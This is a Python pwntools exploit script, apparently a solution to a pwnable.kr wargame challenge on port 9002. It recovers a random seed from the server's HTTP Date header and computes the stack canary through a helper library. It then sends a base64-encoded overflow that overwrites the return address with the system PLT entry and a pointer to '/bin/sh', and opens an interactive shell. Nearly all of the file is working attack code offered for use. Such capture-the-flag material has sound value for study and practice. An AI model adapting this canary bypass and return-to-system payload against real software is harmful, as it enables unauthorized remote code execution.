from pwn import *
import httplib  
import time  
import os
import ctypes

def getRemoteTime(host):
	try:  
		conn=httplib.HTTPConnection(host)  
		conn.request("GET", "/")  
		r=conn.getresponse()  
		ts=r.getheader('date') 
		print '============================'  
		print ts  
		print '============================'  
		ltime= time.strptime(ts[5:25], "%d %b %Y %H:%M:%S")									 
		#print(ltime)  
		return int(time.mktime(ltime))+3600*8
	except:  
		return False  


def poc_exploit():
	seed = getRemoteTime('pwnable.kr')
	print seed
	#connect problem
	conn = remote('pwnable.kr', 9002)
	#read tips
	line = conn.recvlines(2)
	#parse captcha
	captcha = re.findall('-?\d+',line[1])
	cap = int(captcha[0])
	
	#call get canary func
	capso = ctypes.CDLL('./libcanary.so')
	canary = capso.get_canary(seed, cap)
	print canary
	#send captcha
	conn.sendline(captcha[0])
	#read tips
	line = conn.recvlines(2)
	print line

	plt_system = 0x8048880
	g_buf = 0x804b0e0
	#A/bin/sh
	str = b64e('A'*512 + p32(canary) + 'C'*12 + p32(plt_system) + p32(g_buf+0x2d1)*2) + 'A/bin/sh'
	print str
	conn.sendline(str)
	conn.interactive()



if __name__ == "__main__":
	poc_exploit()
